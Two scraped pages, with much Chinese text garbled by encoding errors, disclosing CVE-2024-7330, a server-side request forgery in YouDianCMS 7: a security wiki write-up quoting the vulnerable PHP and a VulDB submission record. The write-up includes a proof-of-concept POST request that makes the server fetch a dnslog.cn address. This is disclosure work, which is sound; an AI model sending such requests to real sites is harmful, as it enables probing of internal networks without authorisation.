=== Content from wiki.shikangsi.com_93b63f22_20250111_102341.html ===

# å®‰å…¨å›¢é˜Ÿè´¡çŒ®å¹³å°

å¯¼èˆªåˆ‡æ¢

* [é¦–é¡µ](/)
* æ‰€æœ‰ä¿¡æ¯
  + [æ‰€æœ‰æƒ…æŠ¥](/list/all/)
  + [æ¨èä¸“åŒº](/list/recommend/)
  + [ç»¼åˆæƒ…æŠ¥](/list/wiki/)
  + [ç”¨æˆ·æäº¤](/list/userpost/)
  + [é«˜æ ¡æƒ…æŠ¥](/list/school/)
* [æ’è¡Œæ¦œ](/user/)
* [ç¤¼å“ä¸­å¿ƒ](/gift/)
* [æœç´¢](/search/)
* [å…¬å‘Š](/announcements/)
* [IPwhoisæ–°åŠŸèƒ½](/ip/)
* [WooYun dropsæ–°åŠŸèƒ½](/wooyun/)
* æ›´å¤š
  + [edudataå¹³å°](https://wiki.shikangsi.com/cas/jump/edudata)
  + [é›¶ç»„çŸ¥è¯†åº“-006åº”æ€¥å“åº”ç›®å½•](https://wiki.shikangsi.com/post/3629/)
  + [é›¶ç»„çŸ¥è¯†åº“-007å†…ç½‘æ¸—é€ç›®å½•](https://wiki.shikangsi.com/post/3631/)
  + [é›¶ç»„çŸ¥è¯†åº“-009å®‰å…¨æŠ€æœ¯ç›®å½•](https://wiki.shikangsi.com/post/3632/)
  + [é›¶ç»„çŸ¥è¯†åº“-010åŸŸæ¸—é€ç›®å½•](https://wiki.shikangsi.com/post/3633/)
  + [é›¶ç»„çŸ¥è¯†åº“-011è¿ç»´ä¸äºŒè¿›åˆ¶å®‰å…¨ç›®å½•](https://wiki.shikangsi.com/post/3634/)
  + [XSSå¹³å°](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrcæ•°æ®åˆ†æ](http://data.shikangsi.com/)
  + [å‹æƒ…é“¾æ¥](https://wiki.shikangsi.com/links/)
  + [wikiç¤¾åŒº](https://wiki.shikangsi.com/zone/)

[æäº¤è´¡çŒ®](/add/)

[ç™»å½•](/login/)

[æ³¨å†Œ](/register/)

# ã€åŸåˆ›ã€‘ï¼ˆCVE-2024-7330ï¼‰YouDianCMS 7 SSRFæ¼æ´

---

åˆ†äº«
### å½“å‰ä¸ºç§å¯†åˆ†äº«ï¼Œæ— éœ€ç™»å½•å³å¯æŸ¥çœ‹ã€‚

---

| æ—¶é—´ | ä½œè€… | å¯è§æ€§ | ç­‰çº§ | Rank |
| --- | --- | --- | --- | --- |
|| 2024-07-21 23:55:43 | [Mstir](/profile/607/) | å…¬å¼€çš„ | ä¸­å± | 0 |
| --- | --- | --- | --- | --- |

CVE-2024-7330
Created: 07/31/2024 02:19 PM
Updated: 08/01/2024 01:20 PM
Changes: 07/31/2024 02:19 PM (56), 08/01/2024 03:25 AM (18), 08/01/2024 01:20 PM (1)
Submitter: Mstir@Wiki

---

# æ¼æ´æè¿°

> YouDianCMS æ˜¯ä¸€æ¬¾å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå¹¿æ³›ç”¨äºç½‘ç«™å†…å®¹çš„åˆ›å»ºã€ç®¡ç†å’Œå‘å¸ƒã€‚

åœ¨YouDianCMSåå°çš„`/App/Core/Extend/Function/ydLib.php`æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨äº†`curl_exec`å‡½æ•°å»è®¿é—®`$url`å˜é‡ã€‚é€šè¿‡å…¨å±€æœç´¢è°ƒç”¨`yd_curl_get`å‡½æ•°çš„æ–‡ä»¶ï¼Œå‘ç°`/App/Lib/Action/Admin/CollectAction.class.php`æ–‡ä»¶ä¸­è°ƒç”¨äº†æ­¤å‡½æ•°ã€‚

`CollectAction.class.php`ä¸­çš„`testField`æ–¹æ³•é€šè¿‡`$_POST`æ¥æ”¶`TestDetailUrl`å‚æ•°ï¼Œå¹¶ä½¿ç”¨`curl_exec`å‘èµ·ç½‘ç»œè¯·æ±‚ã€‚ç”±äº`$url`å˜é‡æœªç»è¿‡ä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„URLï¼Œå¯¼è‡´SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´å‘èµ·å¯¹å†…éƒ¨ç½‘ç»œçš„è¯·æ±‚ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–å¯¹å†…éƒ¨ç½‘ç»œçš„è¿›ä¸€æ­¥æ”»å‡»ã€‚

# å®¡è®¡è¿‡ç¨‹

é—®é¢˜å‡ºè‡ª /App/Core/Extend/Function/ydLib.php ä½¿ç”¨äº†curl\_execå‡½æ•°å»è®¿é—®\$urlå˜é‡.

```
function yd_curl_get($url, $data=false, $timeout = 5, $options=array() ){
  //http_build_query(array('foo'=>'bar','baz'=>'boom')); è¾“å‡ºï¼šfoo=bar&baz=boom
  if(!empty($data)){
    $url .= '?'.http_build_query($data);
  }
  if( function_exists('curl_init') ){
    $ch = curl_init( $url );
    //ç—‡çŠ¶ï¼šphp curlè°ƒç”¨httpså‡ºé”™ æ’æŸ¥æ–¹æ³•ï¼šåœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨curlè°ƒç”¨è¯•è¯•ã€‚
    //åŸå› ï¼šæœåŠ¡å™¨æ‰€åœ¨æœºæˆ¿æ— æ³•éªŒè¯SSLè¯ä¹¦ã€‚è§£å†³åŠæ³•ï¼šè·³è¿‡SSLè¯ä¹¦æ£€æŸ¥ã€‚
    //ä¸åŠ ä¸ŠCURLOPT_SSL_VERIFYPEERï¼Œcurl_execæ€»æ˜¯è¿”å›false
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:220.181.136.242', 'CLIENT-IP:220.181.136.242'));
    //CURLOPT_REFERERã€CURLOPT_USERAGENT
    foreach ($options as $k=>$v){
      $k = is_numeric($k) ? $k : constant($k);
      curl_setopt($ch, $k, $v);
    }
    $res = curl_exec($ch);
    curl_close($ch);
  }else{
    //åˆ©ç”¨äº†stream_context_create()è®¾ç½®è¶…æ—¶æ—¶é—´:
    //å½“è¯»å–httpsåè®®æ—¶ï¼Œéœ€è¦æœåŠ¡å™¨æ”¯æŒopen_sslæ¨¡å—
    $opts = array( 'http' => array('timeout' => $timeout, 'method'=>"GET", 'header'=>'') );
    if( $options['CURLOPT_REFERER']){
      $opts['header'] .= "Referer:".$options['CURLOPT_REFERER']."\r\n";
    }
    if( $options['CURLOPT_USERAGENT']){
      $opts['header'] .= "User-Agent:".$options['CURLOPT_USERAGENT']."\r\n";
    }
    $context = stream_context_create( $opts );
    $res = @file_get_contents( $url, false, $context );
  }
  return $res;
}

```

è°ƒç”¨è¯¥æ–¹æ³•çš„ç¨‹åº: /App/Lib/Action/Admin/CollectAction.class.php

```
public function testField()
    {
        header("Content-Type:text/html; charset=utf-8");
        $url = trim($_POST["TestDetailUrl"]);

        if (empty($url)) {
            if (empty($_POST["DetailUrlRegex"])) {
                $url = $_POST["ListUrl"];
            }
            else {
                $result = $this->_collectList($_POST);

                if (is_array($result)) {
                    $index = rand(0, count($result) - 1);
                    $url = $result[$index];
                }
                else {
                    $this->ajaxReturn($result, "", 0);
                }
            }
        }

        $data = $this->_collectContent($url, $_POST["FieldInfo"], $_POST["ReplacePara"], $_POST);

        if (is_array($data)) {
            $this->ajaxReturn($data, $url, 1);
        }
        else {
            $this->ajaxReturn($data, $url, 0);
        }
    }

```
# POC

```
POST /index.php/Admin/Collect/testField HTTP/1.1
Host: [ç›®æ ‡åŸŸå]
Content-Type: application/x-www-form-urlencoded
Cookie: [ç›®æ ‡Cookie]
Content-Length: 30

TestDetailUrl=xxx.dnslog.cn

```

---

å®¡æ ¸è¯„ä»·ï¼š æ²¡æœ‰ä»»ä½•è¯„ä»·...

2014-2022 Â© è”ç³»é‚®ç®±ï¼šadmin@sg95.cnÂ Â Â Â [é„‚ICPå¤‡15020128å·-4](https://beian.miit.gov.cn)



=== Content from vuldb.com_7f2ad12e_20250111_102339.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)ğŸ›¡ Home[Submit](?submit)378325
# Submit #378325: é•¿æ²™å‹ç‚¹è½¯ä»¶ç§‘æŠ€æœ‰é™å…¬å¸ YouDianCMS 7 Server-Side Request Forgery[info](?kb.submission)

| Title | é•¿æ²™å‹ç‚¹è½¯ä»¶ç§‘æŠ€æœ‰é™å…¬å¸ YouDianCMS 7 Server-Side Request Forgery |
| --- | --- |
| Description | YouDianCMS æ˜¯ä¸€æ¬¾å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå¹¿æ³›ç”¨äºç½‘ç«™å†…å®¹çš„åˆ›å»ºã€ç®¡ç†å’Œå‘å¸ƒã€‚ åœ¨YouDianCMSåå°çš„/App/Core/Extend/Function/ydLib.phpæ–‡ä»¶ä¸­ï¼Œä½¿ç”¨äº†curl\_execå‡½æ•°å»è®¿é—®$urlå˜é‡ã€‚é€šè¿‡å…¨å±€æœç´¢è°ƒç”¨yd\_curl\_getå‡½æ•°çš„æ–‡ä»¶ï¼Œå‘ç°/App/Lib/Action/Admin/CollectAction.class.phpæ–‡ä»¶ä¸­è°ƒç”¨äº†æ­¤å‡½æ•°ã€‚ CollectAction.class.phpä¸­çš„testFieldæ–¹æ³•é€šè¿‡$\_POSTæ¥æ”¶TestDetailUrlå‚æ•°ï¼Œå¹¶ä½¿ç”¨curl\_execå‘èµ·ç½‘ç»œè¯·æ±‚ã€‚ç”±äº$urlå˜é‡æœªç»è¿‡ä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„URLï¼Œå¯¼è‡´SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´å‘èµ·å¯¹å†…éƒ¨ç½‘ç»œçš„è¯·æ±‚ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–å¯¹å†…éƒ¨ç½‘ç»œçš„è¿›ä¸€æ­¥æ”»å‡»ã€‚ |
| Source | âš ï¸ https://wiki.shikangsi.com/post/share/c065b84c-f2ab-4679-9336-de7fb1ebba1f |
| User | [XingYue\_Mstir (UID 72225)](?user.72225) |
| Submission | 07/21/2024 06:25 PM (6 months ago) |
| Moderation | 07/31/2024 02:14 PM (10 days later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [273253](?id.273253) [YouDianCMS 7 ydLib.php curl\_exec url server-side request forgery] |
| Points | 20 |

[â—‚ Previous](?submit.378324)[Overview](?submit)[Next â–¸](?submit.378326)

# Are you interested in using VulDB?

Download the whitepaper to learn more about our service!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[Â© 1997-2025 vuldb.com](?kb.terms) Â· [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.378325 "German") Â· [fr](/fr/?submit.378325 "French") Â· [it](/it/?submit.378325 "Italian") Â· [es](/es/?submit.378325 "Spanish") Â· [pt](/pt/?submit.378325 "Portuguese") Â· [ru](/ru/?submit.378325 "Russian") Â· [pl](/pl/?submit.378325 "Polish") Â· [sv](/sv/?submit.378325 "Swedish") Â· [zh](/zh/?submit.378325 "Chinese") Â· [ja](/ja/?submit.378325 "Japanese") Â· [ar](/ar/?submit.378325 "Arabic")[v18.14.7](?kb.changelog)
